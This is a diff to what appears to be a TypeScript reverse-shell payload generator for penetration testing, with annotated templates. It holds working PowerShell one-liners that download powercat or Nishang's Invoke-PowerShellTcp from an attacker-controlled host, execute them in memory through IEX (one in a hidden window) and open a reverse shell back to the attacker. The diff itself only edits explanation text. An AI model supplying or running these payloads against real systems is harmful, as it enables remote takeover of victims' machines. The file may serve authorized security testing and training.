@@ -97,7 +97,7 @@ export const REVERSE_SHELLS: PayloadDef[] = [
     contexts: ["powershell"], requires: ["powershell", "served-file"],
     template: "IEX(New-Object System.Net.WebClient).DownloadString('http://{LHOST}{WEB_PORT}/powercat.ps1');powercat -c {LHOST} -p {LPORT} -e powershell",
     parts: [
-      { token: "cp /usr/share/windows-resources/powercat/powercat.ps1 .", explain: "On Kali: copies powercat.ps1 (from Kali's powercat package) into the folder you serve." },
+      { token: "cp /usr/share/windows-resources/powercat/powercat.ps1 .", explain: "On Kali: copies powercat.ps1 into the folder you serve. From Kali's `powercat` package." },
       SERVE_PART,
       { token: "IEX(", explain: "Runs the downloaded text as code, so nothing is written to disk." },
       { token: "DownloadString('http://", explain: "Fetches powercat.ps1 from your web server." },
@@ -113,7 +113,7 @@ export const REVERSE_SHELLS: PayloadDef[] = [
     contexts: ["cmd", "powershell", "sql-string"], requires: ["powershell", "served-file"],
     template: `powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://{LHOST}{WEB_PORT}/rev.ps1')"`,
     parts: [
-      { token: "cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 rev.ps1", explain: "On Kali: copies Nishang's reverse-shell script to rev.ps1 in the folder you serve." },
+      { token: "cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 rev.ps1", explain: "On Kali: copies Nishang's reverse-shell script to rev.ps1 in the folder you serve. From Kali's `nishang` package; check the path with `dpkg -L nishang | grep Invoke-PowerShellTcp` if cp fails." },
       {
         token: "echo 'Invoke-PowerShellTcp -Reverse -IPAddress … -Port …' >> rev.ps1",
         explain: "Appends the call, with your LHOST and LPORT, to the end of rev.ps1. Without it IEX only defines the function and nothing connects back.",
